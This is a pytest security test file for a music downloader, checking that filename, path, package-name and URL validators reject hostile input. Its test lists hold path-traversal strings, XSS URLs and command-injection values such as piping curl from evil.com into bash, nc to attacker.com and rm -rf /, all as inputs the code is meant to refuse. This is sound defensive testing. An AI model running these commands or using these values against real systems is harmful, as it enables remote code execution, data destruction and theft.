"""Security-focused tests for the application."""

import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

from musicdl.core.downloader import YTDLPDownloader
from musicdl.core.models import AppConfig
from musicdl.utils.bootstrap import (
    _validate_executable,
    _validate_path_safe,
    _validate_package_name,
    _get_safe_env
)


class TestFilenameSanitization:
    """Test filename sanitization security."""
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        malicious_names = [
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\hosts",
            "~/../../sensitive/file",
            "file../../outside/dir",
            "..\\\\admin\\\\file.txt",
        ]
        
        for malicious_name in malicious_names:
            sanitized = downloader._sanitize_filename(malicious_name)
            
            # Should not contain path traversal sequences
            assert ".." not in sanitized
            assert "/" not in sanitized
            assert "\\\\" not in sanitized
            assert "~" not in sanitized
            
            # Should be safe fallback
            assert sanitized in ["audio", malicious_name.replace("..", "").replace("/", "_").replace("\\\\", "_")]
    
    def test_reserved_names_handling(self):
        """Test handling of Windows reserved names."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        reserved_names = ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]
        
        for name in reserved_names:
            sanitized = downloader._sanitize_filename(name)
            assert sanitized == "audio"  # Should fallback to safe name
    
    def test_hidden_file_prevention(self):
        """Test prevention of hidden files creation."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        hidden_names = [".bashrc", ".ssh_config", ".hidden_file"]
        
        for name in hidden_names:
            sanitized = downloader._sanitize_filename(name)
            assert sanitized == "audio"  # Should not start with dot
    
    def test_filename_length_limiting(self):
        """Test filename length limiting."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        long_name = "A" * 300  # Very long filename
        sanitized = downloader._sanitize_filename(long_name)
        
        assert len(sanitized) <= 255
    
    def test_dangerous_characters_removal(self):
        """Test removal of dangerous characters."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        dangerous_chars = ['<', '>', ':', '"', '|', '?', '*', '\\n', '\\r', '\\t']
        test_name = "file" + "".join(dangerous_chars) + "name"
        
        sanitized = downloader._sanitize_filename(test_name)
        
        for char in dangerous_chars:
            assert char not in sanitized


class TestFFmpegValidation:
    """Test FFmpeg executable validation."""
    
    def test_ffmpeg_path_validation(self):
        """Test FFmpeg path security validation."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        # Test with non-existent file
        assert not downloader._validate_ffmpeg_executable("/non/existent/ffmpeg")
        
        # Test with directory instead of file
        with tempfile.TemporaryDirectory() as temp_dir:
            assert not downloader._validate_ffmpeg_executable(temp_dir)
    
    def test_ffmpeg_traversal_prevention(self):
        """Test prevention of path traversal in FFmpeg path."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        malicious_paths = [
            "../../../usr/bin/rm",
            "..\\\\..\\\\system32\\\\cmd.exe",
            "/tmp/../../../bin/sh",
        ]
        
        for path in malicious_paths:
            assert not downloader._validate_ffmpeg_executable(path)
    
    def test_ffmpeg_name_validation(self):
        """Test that executable name contains 'ffmpeg'."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        # Create a temporary executable that doesn't contain 'ffmpeg'
        with tempfile.NamedTemporaryFile(mode='w', suffix='', delete=False) as f:
            f.write("#!/bin/bash\\necho fake")
            temp_path = Path(f.name)
        
        try:
            temp_path.chmod(0o755)
            assert not downloader._validate_ffmpeg_executable(str(temp_path))
        finally:
            temp_path.unlink()


class TestBootstrapSecurity:
    """Test bootstrap security functions."""
    
    def test_executable_validation(self):
        """Test executable validation function."""
        # Test with non-existent file
        assert not _validate_executable("/non/existent/exe", "test")
        
        # Test with directory
        with tempfile.TemporaryDirectory() as temp_dir:
            assert not _validate_executable(temp_dir, "test")
    
    def test_path_safety_validation(self):
        """Test path safety validation."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\\\..\\\\system32",
            "/absolute/path/outside/project",
        ]
        
        for path in dangerous_paths:
            assert not _validate_path_safe(path)
        
        # Safe relative paths should pass
        safe_paths = ["relative/path", "file.txt", "subdir/file.txt"]
        for path in safe_paths:
            assert _validate_path_safe(path)
    
    def test_package_name_validation(self):
        """Test package name validation for security."""
        valid_packages = [
            "requests",
            "django>=3.0",
            "package-name==1.0.0",
            "my_package>=1.0,<2.0",
        ]
        
        for package in valid_packages:
            assert _validate_package_name(package), f"Should be valid: {package}"
        
        malicious_packages = [
            "package; rm -rf /",
            "package && curl evil.com/script | bash",
            "package | nc attacker.com 4444",
            "package`whoami`",
            "package$(id)",
            "package{cat,/etc/passwd}",
        ]
        
        for package in malicious_packages:
            assert not _validate_package_name(package), f"Should be invalid: {package}"
    
    def test_safe_environment(self):
        """Test safe environment creation."""
        env = _get_safe_env()
        
        # Should contain essential variables
        essential_vars = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'LANG']
        for var in essential_vars:
            assert var in env
        
        # Should not contain dangerous variables
        dangerous_vars = ['LD_PRELOAD', 'PYTHONPATH', 'NODE_PATH']
        for var in dangerous_vars:
            if var in env:
                # If it exists, it should be from the original environment
                pass  # This is acceptable


class TestInputValidation:
    """Test input validation across the application."""
    
    def test_url_validation_xss_prevention(self):
        """Test URL validation prevents XSS attempts."""
        from musicdl.core.url_processor import URLProcessor
        
        processor = URLProcessor()
        
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "file:///etc/passwd",
            "ftp://evil.com/malware",
        ]
        
        for url in malicious_urls:
            assert not processor.is_valid_youtube_url(url)
    
    def test_csv_path_validation(self):
        """Test CSV file path validation."""
        from musicdl.core.csv_parser import CSVParser
        
        parser = CSVParser()
        
        dangerous_paths = [
            Path("../../../etc/passwd"),
            Path("..\\\\..\\\\system32\\\\config\\\\sam"),
            Path("/dev/null"),
            Path("~/.ssh/id_rsa"),
        ]
        
        for path in dangerous_paths:
            with pytest.raises(Exception):  # Should raise CSVParsingError or similar
                parser.load_csv(path)


class TestConcurrentDownloadSecurity:
    """Test security aspects of concurrent downloads."""
    
    def test_worker_limit_enforcement(self):
        """Test that worker limits are enforced."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        # Test with excessive worker count
        from musicdl.core.models import TrackItem
        tracks = [
            TrackItem("Artist", "Title", "Query", "stub") 
            for _ in range(3)
        ]
        
        # Mock the download_track method to prevent actual downloads
        with patch.object(downloader, 'download_track') as mock_download:
            mock_download.return_value = MagicMock(success=True)
            
            results = downloader.download_multiple_concurrent(
                tracks, 
                max_workers=100  # Excessive number
            )
            
            # Should be limited internally (implementation should cap at 5)
            assert len(results) == 3
    
    def test_resource_cleanup(self):
        """Test that resources are properly cleaned up."""
        config = AppConfig()
        downloader = YTDLPDownloader(config)
        
        from musicdl.core.models import TrackItem
        tracks = [TrackItem("Artist", "Title", "Query", "stub")]
        
        # Mock download_track to simulate an exception
        with patch.object(downloader, 'download_track') as mock_download:
            mock_download.side_effect = Exception("Simulated error")
            
            # Should handle exceptions gracefully
            results = downloader.download_multiple_concurrent(tracks)
            
            # Should return error result, not crash
            assert len(results) == 1
            assert not results[0].success